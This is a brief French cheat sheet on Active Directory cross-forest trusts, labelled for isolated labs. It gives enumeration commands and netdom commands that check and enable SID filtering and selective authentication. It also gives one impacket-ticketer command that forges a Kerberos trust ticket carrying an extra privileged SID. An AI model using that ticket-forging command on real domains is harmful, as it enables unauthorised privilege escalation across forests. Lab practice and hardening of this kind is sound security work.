# Trusts cross-forest — aide-mémoire (lab isolé uniquement)

## Énumération
Get-ADTrust -Filter * | Select Name,Direction,TrustType,SIDFilteringQuarantined
# PowerView : Get-DomainTrust ; Get-ForestTrust
nxc ldap <dc> -M enum_trusts

## SID filtering (protection)
netdom trust <forêtA> /domain:<forêtB> /quarantine           # état
netdom trust <forêtA> /domain:<forêtB> /quarantine:Yes       # activer (durcir)
# Selective Authentication : /SelectiveAUTH:Yes

## Abus SID history (si filtering OFF, lab)
impacket-ticketer -nthash <trust_key> -domain-sid <SID_src> -domain <src> \
  -extra-sid <SID_privilegié_cible> -spn krbtgt/<cible> Administrator

## Toujours re-durcir (quarantine + selective auth) après l'exercice.
